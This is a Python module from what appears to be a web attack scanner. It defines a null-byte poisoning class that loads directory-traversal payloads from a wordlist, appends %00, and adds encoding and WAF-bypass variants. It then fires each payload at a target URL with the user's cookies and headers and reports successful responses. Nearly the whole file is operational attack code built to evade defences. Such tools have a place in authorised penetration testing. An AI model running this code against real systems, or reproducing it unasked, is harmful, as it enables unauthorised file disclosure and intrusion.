from .Detection import Detection
from .utils import attack, cook, parse_headers, parse_post_data
from .rich_output import colors, print_error, print_success, print_info
from .Encoding import EncodingBypass
from .WafBypass import WafBypass


class NullByte:
    def __init__(self, args):
        self.target = args.url
        self.cookies = args.cookies
        self.detection = args.detection
        self.use_encoding = getattr(args, "encoding", False)
        self.method = getattr(args, "method", "GET")
        self.custom_headers = parse_headers(getattr(args, "headers", None))
        self.post_data = parse_post_data(getattr(args, "post_data", None))
        self.use_waf_bypass = getattr(args, "waf_bypass", False)

    def attack(self, payload):
        payload = f"{payload}%00"
        cookies = cook(self.cookies) if self.cookies else None

        response = attack(
            self.target,
            payload,
            cookies=cookies,
            detection_mode=self.detection,
            method=self.method,
            post_data=self.post_data,
            custom_headers=self.custom_headers,
        )
        return response

    def execute_null_byte(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        print(colors("[~] Testing for Null Byte Poisoning", 93))
        print(colors(f"[~] Using HTTP method: {self.method}", 94))

        if self.use_encoding:
            print(colors("[~] Advanced encoding bypasses enabled", 94))

        if self.custom_headers:
            print(colors(f"[~] Custom headers: {self.custom_headers}", 94))

        with open("payload_wordlists/directory_traversal_list.txt", "r") as payloadfile:
            payloads = payloadfile.readlines()

            for payload in payloads:
                payload = payload.strip()
                test_payloads = [payload]

                if self.use_encoding:
                    # Generate encoding variants
                    variants = EncodingBypass.generate_all_variants(payload)
                    test_payloads.extend(
                        variants[:10]
                    )  # Limit to first 10 variants to avoid spam

                if self.use_waf_bypass:
                    # Generate WAF bypass variants
                    waf_variants = WafBypass.generate_waf_bypass_variants(payload)
                    test_payloads.extend(
                        waf_variants[:8]
                    )  # Limit WAF variants to avoid excessive requests

                for test_payload in test_payloads:
                    try:
                        response = self.attack(test_payload)
                        if response and response.status_code == 200:
                            print(
                                colors(
                                    f"[+] Null byte response received for: {test_payload}",
                                    92,
                                )
                            )
                    except Exception as e:
                        continue
